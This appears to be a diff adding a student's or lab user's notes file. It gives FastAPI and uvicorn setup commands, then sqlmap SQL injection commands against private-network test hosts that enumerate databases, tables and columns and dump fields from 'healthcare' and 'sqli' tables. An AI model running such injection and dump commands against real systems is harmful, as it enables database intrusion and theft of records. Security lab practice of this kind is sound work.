@@ -1,0 +1,36 @@
+https://pypi.org/project/fastapi/
+pip install fastapi
+--pip install "uvicorn[standard]"
+pip install uvicorn
+pip install pandas
+----------------------------------------------------------------------------------
+open the terminal in vscode and run the following command(fastapi)
+
+uvicorn main:app --reload --workers 1 --host 0.0.0.0 --port 8008
+
+python -m uvicorn main:app --reload --workers 1 --host 172.17.57.30 --port 8008
+
+sqlmap -u http://172.17.57.30/proj3/?sitem=1 --dbs
+
+sqlmap -u http://172.17.57.30/proj3/?sitem=1 -D heathcare --tables
+
+sqlmap -u http://172.17.57.30/proj3/?sitem=1 -D healthcare -T doctors --columns
+
+sqlmap -u http://172.17.57.30/proj3/?sitem=1 -D healthcare -T doctors -C name --dump
+
+192.168.168.151
+
+-----------------------------------------------------------------------------------
+
+172.17.63.65(VB)
+python -m uvicorn main:app --reload --workers 1 --host 172.17.57.247 --port 8008
+
+sqlmap -u http://172.17.57.28:8080/proj/?sitem=1 --dbs
+
+sqlmap -u http://172.17.57.28:8080/proj/?sitem=1 -D sqli --tables
+
+sqlmap -u http://172.17.57.28:8080/proj/?sitem=1 -D sqli -T user --columns
+
+sqlmap -u http://172.17.57.28:8080/proj?sitem=1 -D sqli -T user -C name --dump
+
+sqlmap -u http://172.17.57.28:8080/proj --dbs
